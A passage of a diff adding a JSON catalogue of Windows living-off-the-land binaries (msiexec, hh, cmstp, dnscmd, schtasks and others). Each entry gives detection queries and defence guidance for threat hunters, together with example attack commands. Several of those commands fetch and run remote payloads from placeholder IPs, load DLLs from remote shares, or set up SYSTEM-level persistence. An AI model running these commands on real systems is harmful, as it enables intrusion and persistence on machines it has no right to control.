+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Wscript.yml",
+        "https://attack.mitre.org/techniques/T1564/004/"
+      ]
+    },
+    {
+      "id": "forfiles",
+      "name": "forfiles.exe",
+      "path": "C:\\Windows\\System32\\forfiles.exe",
+      "category": "Execute",
+      "description": "Selects files matching a mask and runs a command against each match, intended for batch processing. It is LOLBAS-relevant because its /c handler will execute an arbitrary command, indirectly proxying execution away from a direct parent-child relationship with cmd.exe.",
+      "legitimate_use": "Used in batch scripts to run a command against a set of files, such as cleanup or archival routines.",
+      "attack_techniques": [
+        {"id": "T1202", "name": "Indirect Command Execution"}
+      ],
+      "example_commands": [
+        {"command": "forfiles /p C:\\Windows\\System32 /m notepad.exe /c \"cmd.exe /c whoami\"", "purpose": "Indirectly executes a command via forfiles' /c handler, evading direct cmd.exe parent-child monitoring"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"forfiles.exe\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Forfiles Indirect Command Execution\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\forfiles.exe'\n    CommandLine|contains: '/c'\n  condition: selection\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"forfiles.exe\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name"
+      },
+      "false_positives": [
+        "Legitimate batch-processing or cleanup scripts that operate over sets of files",
+        "Backup software using forfiles to prune aged files"
+      ],
+      "defence_guidance": [
+        "Forfiles.exe is rarely used interactively by end users; on standard workstations it can often be blocked via WDAC with low operational impact",
+        "Where retained for scheduled maintenance, baseline expected /p and /m arguments and alert on deviations"
+      ],
+      "related_lolbins": ["pcalua", "schtasks"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Forfiles.yml",
+        "https://attack.mitre.org/techniques/T1202/"
+      ]
+    },
+    {
+      "id": "msiexec",
+      "name": "msiexec.exe",
+      "path": "C:\\Windows\\System32\\msiexec.exe",
+      "category": "Execute",
+      "description": "The Windows Installer engine that processes .msi packages. It is LOLBAS-relevant because it can silently install a remote or renamed .msi containing attacker code, or call DllRegisterServer/DllUnregisterServer on a target DLL.",
+      "legitimate_use": "Installs, repairs, and uninstalls software packaged as Windows Installer (.msi) files, used extensively by software deployment tools.",
+      "attack_techniques": [
+        {"id": "T1218.007", "name": "System Binary Proxy Execution: Msiexec"}
+      ],
+      "example_commands": [
+        {"command": "msiexec /q /i http://203.0.113.80/payload.msi", "purpose": "Silently installs a remote MSI package containing attacker code"},
+        {"command": "msiexec /y payload.dll", "purpose": "Calls DllRegisterServer on a target DLL via the /y flag"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"msiexec.exe\"\n| where ProcessCommandLine has_any (\"http://\", \"https://\") or ProcessCommandLine has \"/y\" or ProcessCommandLine has \"/z\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Msiexec Remote Install or DLL Registration\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_web:\n    Image|endswith: '\\msiexec.exe'\n    CommandLine|contains:\n      - 'http://'\n      - 'https://'\n  selection_dll:\n    Image|endswith: '\\msiexec.exe'\n    CommandLine|re: '\\s/[yz]\\s'\n  condition: 1 of selection_*\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"msiexec.exe\"\n| filter action_process_image_command_line contains \"http\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "SCCM, Intune, or Group Policy Software Installation deploying MSI packages from internal distribution points",
+        "Legitimate software updaters that install MSIs from vendor CDNs"
+      ],
+      "defence_guidance": [
+        "Msiexec.exe cannot be blocked (core OS install mechanism); harden via Group Policy to restrict 'Always install with elevated privileges' and remote MSI sources",
+        "Alert on msiexec /i with an http(s):// or non-approved UNC source outside recognized deployment tooling"
+      ],
+      "related_lolbins": ["odbcconf", "control"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Msiexec.yml",
+        "https://attack.mitre.org/techniques/T1218/007/"
+      ]
+    },
+    {
+      "id": "odbcconf",
+      "name": "odbcconf.exe",
+      "path": "C:\\Windows\\System32\\odbcconf.exe",
+      "category": "Bypass",
+      "description": "Configures ODBC drivers and data sources from the command line. It is LOLBAS-relevant because its REGSVR action calls DllRegisterServer on a target DLL, and a response file (.rsp) can also specify a DLL to load, bypassing application whitelisting.",
+      "legitimate_use": "Installs and configures ODBC drivers and DSNs, typically used by database client software during setup.",
+      "attack_techniques": [
+        {"id": "T1218.008", "name": "System Binary Proxy Execution: Odbcconf"}
+      ],
+      "example_commands": [
+        {"command": "odbcconf /a {REGSVR payload.dll}", "purpose": "Executes DllRegisterServer in a target DLL via odbcconf's driver registration action"},
+        {"command": "odbcconf -f response.rsp", "purpose": "Loads a DLL path specified inside a response file"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"odbcconf.exe\"\n| where ProcessCommandLine has_any (\"REGSVR\", \"-f\", \"INSTALLDRIVER\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Odbcconf DLL Registration or Response File Load\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\odbcconf.exe'\n    CommandLine|contains:\n      - 'REGSVR'\n      - '.rsp'\n      - 'INSTALLDRIVER'\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"odbcconf.exe\"\n| filter action_process_image_command_line contains \"REGSVR\" or action_process_image_command_line contains \".rsp\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate ODBC driver installation performed by database client software",
+        "Database administration tooling configuring DSNs during setup"
+      ],
+      "defence_guidance": [
+        "Odbcconf.exe is on Microsoft's recommended WDAC block-rule list; safe to deny on endpoints that do not manage ODBC data sources",
+        "Where ODBC management is required, restrict to known administrator accounts and log all invocations"
+      ],
+      "related_lolbins": ["rundll32", "regsvr32", "msiexec"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Odbcconf.yml",
+        "https://attack.mitre.org/techniques/T1218/008/"
+      ]
+    },
+    {
+      "id": "control",
+      "name": "control.exe",
+      "path": "C:\\Windows\\System32\\control.exe",
+      "category": "Execute",
+      "description": "Launches Control Panel and individual Control Panel items (.cpl files, which are DLLs exporting a CPlApplet function). It is LOLBAS-relevant because it will execute a malicious .cpl or a DLL staged in an Alternate Data Stream.",
+      "legitimate_use": "Opens the Windows Control Panel or a specific Control Panel applet from the command line.",
+      "attack_techniques": [
+        {"id": "T1218.002", "name": "System Binary Proxy Execution: Control Panel"}
+      ],
+      "example_commands": [
+        {"command": "control.exe payload.cpl", "purpose": "Executes a malicious Control Panel Item DLL via its CPlApplet export"},
+        {"command": "control.exe notes.txt:evil.dll", "purpose": "Executes a DLL staged in an Alternate Data Stream via control.exe"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"control.exe\"\n| where ProcessCommandLine has \".cpl\" and FolderPath !contains \"System32\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Control.exe Executing CPL From Non-Standard Path\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\control.exe'\n    CommandLine|contains: '.cpl'\n  filter_system:\n    CommandLine|contains: '\\Windows\\System32\\'\n  condition: selection and not filter_system\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"control.exe\"\n| filter action_process_image_command_line contains \".cpl\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate custom Control Panel applets deployed by endpoint management or hardware vendor software",
+        "Users launching standard Control Panel applets by their .cpl name"
+      ],
+      "defence_guidance": [
+        "Restrict execution of .cpl files from non-standard or user-writable directories via WDAC path rules rather than blocking control.exe outright",
+        "Alert on control.exe command lines containing an Alternate Data Stream pattern (filename:stream)"
+      ],
+      "related_lolbins": ["rundll32", "verclsid"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Control.yml",
+        "https://attack.mitre.org/techniques/T1218/002/"
+      ]
+    },
+    {
+      "id": "hh",
+      "name": "hh.exe",
+      "path": "C:\\Windows\\hh.exe",
+      "category": "Execute",
+      "description": "The HTML Help executable that opens Compiled HTML Help (.chm) files. It is LOLBAS-relevant because a crafted .chm can embed shortcuts or scripts that execute commands when opened, and hh.exe will also fetch remote .chm/.bat content.",
+      "legitimate_use": "Displays Windows Help (.chm) documentation files bundled with older applications and OS components.",
+      "attack_techniques": [
+        {"id": "T1218.001", "name": "System Binary Proxy Execution: Compiled HTML File"},
+        {"id": "T1105", "name": "Ingress Tool Transfer"}
+      ],
+      "example_commands": [
+        {"command": "hh.exe http://203.0.113.90/payload.chm", "purpose": "Downloads and opens a remote CHM file containing embedded shortcut/script commands"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"hh.exe\"\n| where ProcessCommandLine has_any (\"http://\", \"https://\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Hh.exe Opening Remote CHM File\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\hh.exe'\n    CommandLine|contains:\n      - 'http://'\n      - 'https://'\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"hh.exe\"\n| filter action_process_image_command_line contains \"http\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate viewing of local .chm help files bundled with internal or third-party applications"
+      ],
+      "defence_guidance": [
+        "Hh.exe is on Microsoft's recommended WDAC block-rule list for high-security baselines; CHM help viewing is largely obsolete, so blocking is low-impact for most modern estates",
+        "Where retained, alert on hh.exe invoked with a remote URL rather than a local .chm path"
+      ],
+      "related_lolbins": ["mshta", "cscript"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Hh.yml",
+        "https://attack.mitre.org/techniques/T1218/001/",
+        "https://attack.mitre.org/techniques/T1105/"
+      ]
+    },
+    {
+      "id": "ie4uinit",
+      "name": "ie4uinit.exe",
+      "path": "C:\\Windows\\System32\\ie4uinit.exe",
+      "category": "Execute",
+      "description": "Applies Internet Explorer 4.x-era per-user initialization settings by processing an ieuinit.inf file. It is LOLBAS-relevant because a crafted ieuinit.inf placed outside the expected %windir% path can be loaded to trigger unauthorized actions.",
+      "legitimate_use": "Performs one-time Internet Explorer/legacy component initialization during OS setup or new user profile creation.",
+      "attack_techniques": [
+        {"id": "T1218", "name": "System Binary Proxy Execution"}
+      ],
+      "example_commands": [
+        {"command": "ie4uinit.exe -BaseSettings", "purpose": "Triggers ie4uinit to process a specially crafted ieuinit.inf file and execute attacker-controlled actions"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"ie4uinit.exe\"\n| where FolderPath !startswith @\"C:\\Windows\\\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath",
+        "sigma": "title: Ie4uinit Running Outside Windows Directory\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\ie4uinit.exe'\n  filter_windir:\n    Image|startswith: 'C:\\Windows\\'\n  condition: selection and not filter_windir\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"ie4uinit.exe\"\n| filter not(action_process_image_path contains \"\\\\Windows\\\\\")\n| fields agent_hostname, actor_effective_username, action_process_image_path, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Normal Internet Explorer/legacy component initialization during OS setup or new profile creation"
+      ],
+      "defence_guidance": [
+        "Monitor for ie4uinit.exe loading ieuinit.inf from a path outside %windir%, which is the key abuse indicator",
+        "Blocking outright is generally low-risk on modern builds where IE legacy components are deprecated"
+      ],
+      "related_lolbins": ["pcalua", "verclsid"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Ie4uinit.yml",
+        "https://attack.mitre.org/techniques/T1218/"
+      ]
+    },
+    {
+      "id": "pcalua",
+      "name": "pcalua.exe",
+      "path": "C:\\Windows\\System32\\pcalua.exe",
+      "category": "Execute",
+      "description": "The Program Compatibility Assistant helper, normally launched by Windows to offer compatibility fixes for older applications. It is LOLBAS-relevant because its -a switch will directly launch a target executable or remote DLL, indirectly proxying execution.",
+      "legitimate_use": "Assists Windows in detecting and offering compatibility settings for legacy applications that may not run correctly on the current OS version.",
+      "attack_techniques": [
+        {"id": "T1202", "name": "Indirect Command Execution"}
+      ],
+      "example_commands": [
+        {"command": "pcalua.exe -a payload.exe", "purpose": "Launches an executable via the Program Compatibility Assistant, indirectly proxying execution"},
+        {"command": "pcalua.exe -a \\\\198.51.100.10\\share\\payload.dll", "purpose": "Launches a DLL hosted on a remote SMB share via PCA"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"pcalua.exe\"\n| where ProcessCommandLine has \"-a\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Pcalua Indirect Execution\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\pcalua.exe'\n    CommandLine|contains: '-a '\n  condition: selection\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"pcalua.exe\"\n| filter action_process_image_command_line contains \"-a \"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate compatibility-shim prompts triggered when users run older applications"
+      ],
+      "defence_guidance": [
+        "Pcalua.exe is rarely needed for scripted/automated execution; alert on non-interactive invocation and consider blocking via WDAC on server or kiosk builds",
+        "Flag pcalua.exe launching targets from remote SMB shares"
+      ],
+      "related_lolbins": ["forfiles", "ie4uinit"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Pcalua.yml",
+        "https://attack.mitre.org/techniques/T1202/"
+      ]
+    },
+    {
+      "id": "verclsid",
+      "name": "verclsid.exe",
+      "path": "C:\\Windows\\System32\\verclsid.exe",
+      "category": "Execute",
+      "description": "Verifies a COM object before Windows Explorer instantiates it. It is LOLBAS-relevant because it can be pointed at an attacker-registered or hijacked CLSID to instantiate and execute a COM payload directly.",
+      "legitimate_use": "Normally invoked silently by Windows Explorer's shell-extension verification logic before loading unfamiliar COM shell extensions.",
+      "attack_techniques": [
+        {"id": "T1218.012", "name": "System Binary Proxy Execution: Verclsid"}
+      ],
+      "example_commands": [
+        {"command": "verclsid.exe /S /C {12345678-1234-1234-1234-1234567890AB}", "purpose": "Instantiates and executes a registered or hijacked COM object by CLSID"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"verclsid.exe\"\n| where ProcessCommandLine has \"/C\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Verclsid Executing Attacker CLSID\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\verclsid.exe'\n    CommandLine|contains: '/C'\n  filter_explorer:\n    ParentImage|endswith: '\\explorer.exe'\n  condition: selection and not filter_explorer\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"verclsid.exe\"\n| filter causality_actor_process_image_name != \"explorer.exe\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name"
+      },
+      "false_positives": [
+        "Legitimate Explorer shell-extension verification, which runs verclsid silently in the background with Explorer as parent"
+      ],
+      "defence_guidance": [
+        "Verclsid.exe is rarely invoked directly by users; alert on any command-line invocation not spawned by explorer.exe",
+        "Consider blocking via WDAC since scripted or manual invocation is inherently suspicious"
+      ],
+      "related_lolbins": ["control", "ie4uinit"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Verclsid.yml",
+        "https://attack.mitre.org/techniques/T1218/012/"
+      ]
+    },
+    {
+      "id": "msxsl",
+      "name": "msxsl.exe",
+      "path": "C:\\Users\\Public\\msxsl.exe",
+      "category": "Bypass",
+      "description": "A standalone command-line utility (not shipped with Windows by default) for performing XSL transformations. It is LOLBAS-relevant because XSL stylesheets can embed COM scriptlet code that executes during the transform, and remote XML/XSL pairs can be fetched and run directly.",
+      "legitimate_use": "Used by developers and data-integration jobs to apply XSLT transformations to XML documents from the command line.",
+      "attack_techniques": [
+        {"id": "T1220", "name": "XSL Script Processing"},
+        {"id": "T1105", "name": "Ingress Tool Transfer"}
+      ],
+      "example_commands": [
+        {"command": "msxsl.exe http://203.0.113.110/payload.xml http://203.0.113.110/payload.xsl", "purpose": "Fetches remote XML/XSL files and executes embedded COM scriptlet code during the transform"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"msxsl.exe\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath",
+        "sigma": "title: Msxsl.exe Presence or Execution\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\msxsl.exe'\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"msxsl.exe\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line, action_process_image_path"
+      },
+      "false_positives": [
+        "Legitimate XML/XSLT batch transformation tooling deliberately deployed by developers or data-integration jobs (rare, since msxsl is not installed by default)"
+      ],
+      "defence_guidance": [
+        "Msxsl.exe is not shipped with Windows; since it must be dropped onto a host first, blocking or alerting on its mere presence via WDAC path/hash rules is low-risk and high-value",
+        "Where a genuine business need exists, restrict to a known, signed copy in an approved directory"
+      ],
+      "related_lolbins": ["wmic", "cmstp"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OtherMSBinaries/Msxsl.yml",
+        "https://attack.mitre.org/techniques/T1220/",
+        "https://attack.mitre.org/techniques/T1105/"
+      ]
+    },
+    {
+      "id": "cmstp",
+      "name": "cmstp.exe",
+      "path": "C:\\Windows\\System32\\cmstp.exe",
+      "category": "Bypass",
+      "description": "The Microsoft Connection Manager Profile Installer, which installs or removes VPN/dial-up connection profiles from an .inf file. It is LOLBAS-relevant because a crafted INF can contain an UnRegisterOCXSection that executes a remote or local .sct scriptlet via scrobj.dll, bypassing application whitelisting.",
+      "legitimate_use": "Installs Connection Manager service profiles used to configure VPN or dial-up network connections.",
+      "attack_techniques": [
+        {"id": "T1218.003", "name": "System Binary Proxy Execution: CMSTP"}
+      ],
+      "example_commands": [
+        {"command": "cmstp.exe /ni /s payload.inf", "purpose": "Silently installs a crafted Connection Manager profile INF that executes an embedded SCT scriptlet, bypassing application whitelisting"},
+        {"command": "cmstp.exe /ni /s http://203.0.113.120/payload.inf", "purpose": "Same technique using a remotely hosted INF file"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"cmstp.exe\"\n| where ProcessCommandLine has \"/s\" and ProcessCommandLine has \".inf\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Cmstp AWL Bypass via Malicious INF\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\cmstp.exe'\n    CommandLine|contains:\n      - '/ni'\n      - '/s'\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"cmstp.exe\"\n| filter action_process_image_command_line contains \"/s\" and action_process_image_command_line contains \".inf\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate VPN/dial-up Connection Manager profile deployment (rare in modern estates using native VPN clients)"
+      ],
+      "defence_guidance": [
+        "Cmstp.exe is a Microsoft-recommended WDAC block-rule binary; Connection Manager profiles are largely legacy technology, so blocking carries low operational impact for most organizations",
+        "Where retained, alert on any /s invocation targeting an INF outside a known corporate VPN deployment path"
+      ],
+      "related_lolbins": ["regsvr32", "msxsl"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Cmstp.yml",
+        "https://attack.mitre.org/techniques/T1218/003/"
+      ]
+    },
+    {
+      "id": "presentationhost",
+      "name": "PresentationHost.exe",
+      "path": "C:\\Windows\\System32\\PresentationHost.exe",
+      "category": "Execute",
+      "description": "Hosts XAML Browser Applications (XBAP), a now-deprecated WPF technology for browser-delivered applications. It is LOLBAS-relevant because it will execute a local .xbap file or fetch and cache a remote payload.",
+      "legitimate_use": "Historically hosted internal line-of-business XAML Browser Applications delivered through Internet Explorer.",
+      "attack_techniques": [
+        {"id": "T1218", "name": "System Binary Proxy Execution"},
+        {"id": "T1105", "name": "Ingress Tool Transfer"}
+      ],
+      "example_commands": [
+        {"command": "PresentationHost.exe payload.xbap", "purpose": "Executes a XAML Browser Application (XBAP), which can carry attacker code"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"presentationhost.exe\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath",
+        "sigma": "title: PresentationHost XBAP Execution\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\PresentationHost.exe'\n  condition: selection\nlevel: medium",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"presentationhost.exe\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate internal XBAP applications (rare; XBAP is deprecated technology in modern .NET/Edge)"
+      ],
+      "defence_guidance": [
+        "XBAP execution is deprecated technology with essentially no remaining legitimate use in most organizations; blocking presentationhost.exe via WDAC carries very low operational risk",
+        "Where any internal XBAP app is still in use, scope allowed .xbap execution to a known, signed application path"
+      ],
+      "related_lolbins": ["mshta", "installutil"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Presentationhost.yml",
+        "https://attack.mitre.org/techniques/T1218/",
+        "https://attack.mitre.org/techniques/T1105/"
+      ]
+    },
+    {
+      "id": "dnscmd",
+      "name": "dnscmd.exe",
+      "path": "C:\\Windows\\System32\\dnscmd.exe",
+      "category": "Persistence",
+      "description": "A command-line interface for managing Microsoft DNS Server. It is LOLBAS-relevant because a member of the DnsAdmins group can register an attacker-controlled DLL as a DNS server plug-in, achieving code execution and persistence with SYSTEM privileges on a Domain Controller.",
+      "legitimate_use": "Used by DNS/AD administrators to configure and manage zones, records, and server-level settings on a Windows DNS Server.",
+      "attack_techniques": [
+        {"id": "T1543.003", "name": "Create or Modify System Process: Windows Service"}
+      ],
+      "example_commands": [
+        {"command": "dnscmd.exe dc1.corp.local /config /serverlevelplugindll \\\\203.0.113.130\\share\\payload.dll", "purpose": "Registers a malicious DLL as a DNS server plug-in for SYSTEM-level persistence on a Domain Controller"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"dnscmd.exe\"\n| where ProcessCommandLine has \"serverlevelplugindll\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Dnscmd Serverlevelplugindll Persistence\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\dnscmd.exe'\n    CommandLine|contains: 'serverlevelplugindll'\n  condition: selection\nlevel: critical",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"dnscmd.exe\"\n| filter action_process_image_command_line contains \"serverlevelplugindll\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate DNS server plug-in configuration by DNS/AD administrators deploying an approved extensibility DLL (extremely rare in normal operations)"
+      ],
+      "defence_guidance": [
+        "Tightly restrict DnsAdmins group membership — this is the well-known DnsAdmins-to-Domain-Controller compromise path",
+        "Alert on any /config /serverlevelplugindll usage; there is essentially no routine business need for it outside a specific, planned DNS extensibility deployment"
+      ],
+      "related_lolbins": ["schtasks"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Dnscmd.yml",
+        "https://attack.mitre.org/techniques/T1543/003/"
+      ]
+    },
+    {
+      "id": "schtasks",
+      "name": "schtasks.exe",
+      "path": "C:\\Windows\\System32\\schtasks.exe",
+      "category": "Persistence",
+      "description": "Command-line interface to the Windows Task Scheduler. It is LOLBAS-relevant because it can create recurring or remote scheduled tasks that re-execute a payload, providing both persistence and lateral-movement capability.",
+      "legitimate_use": "Used by administrators and deployment tools to create, modify, and manage scheduled tasks for patching, backups, and monitoring agents.",
+      "attack_techniques": [
+        {"id": "T1053.005", "name": "Scheduled Task/Job: Scheduled Task"}
+      ],
+      "example_commands": [
+        {"command": "schtasks /create /sc minute /mo 1 /tn \"Updater\" /tr \"C:\\Users\\Public\\payload.exe\"", "purpose": "Creates a scheduled task that re-executes a payload every minute for persistence"},
+        {"command": "schtasks /create /s 198.51.100.10 /tn \"MyTask\" /tr \"C:\\Windows\\Temp\\payload.exe\" /sc daily", "purpose": "Creates a scheduled task on a remote host for persistence or lateral movement"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"schtasks.exe\"\n| where ProcessCommandLine has \"/create\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Suspicious Scheduled Task Creation via Schtasks\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\schtasks.exe'\n    CommandLine|contains: '/create'\n  susp_path:\n    CommandLine|contains:\n      - '\\Users\\Public\\'\n      - '\\Temp\\'\n      - '\\AppData\\'\n  condition: selection and susp_path\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"schtasks.exe\"\n| filter action_process_image_command_line contains \"/create\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate IT-deployed scheduled tasks for patching, backups, and monitoring agents",
+        "Software installers registering an update-check task during setup"
+      ],
+      "defence_guidance": [
+        "Schtasks.exe cannot be blocked (core admin tool); instead baseline expected task names, authors, and /tr targets",
+        "Alert on new tasks created by non-administrative processes or with /tr targets pointing into user-writable paths such as Temp, Downloads, or AppData"
+      ],
+      "related_lolbins": ["dnscmd", "forfiles"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Schtasks.yml",
+        "https://attack.mitre.org/techniques/T1053/005/"
+      ]
+    }
+  ]
+}
